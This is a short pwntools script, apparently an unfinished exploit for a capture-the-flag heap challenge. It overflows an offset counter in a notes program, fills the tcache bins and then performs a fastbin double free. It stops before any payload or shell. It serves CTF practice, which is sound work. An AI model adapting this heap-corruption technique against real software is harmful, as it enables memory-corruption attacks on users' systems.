#!/usr/bin/env python3

from pwn import ELF, process, remote, gdb, context

#context.terminal = ["tmux", "splitw", "-h"]

bin = ELF("./chall/app")

p = process("./chall/app")
pid = gdb.attach(p, gdbscript="""
b * eton + 878
""")
#p = remote("localhost", 1337)

def malloc(p, idx, data):
    p.sendline(b"note add " + idx + data)

def free(p, idx):
    p.sendline(b"note remove " + idx)

# overflow the offset counter
payload_1 = b"touch "
payload_1 += 128 * b"A"
p.sendline(payload_1)

# heap stuff
# tcachebins
malloc(p, b"0", b" AAAAAAAA")
malloc(p, b"1", b" BBBBBBBB")
malloc(p, b"2", b" CCCCCCCC")
malloc(p, b"3", b" DDDDDDDD")
malloc(p, b"4", b" EEEEEEEE")
malloc(p, b"5", b" FFFFFFFF")
malloc(p, b"6", b" GGGGGGGG")

# fastbins
malloc(p, b"7", b" HHHHHHHH")
malloc(p, b"8", b" IIIIIIII")

free(p, b"0")
free(p, b"1")
free(p, b"2")
free(p, b"3")
free(p, b"4")
free(p, b"5")
free(p, b"6")

free(p, b"7")
free(p, b"7")

#malloc(p)
#malloc(p)
#malloc(p)

p.interactive()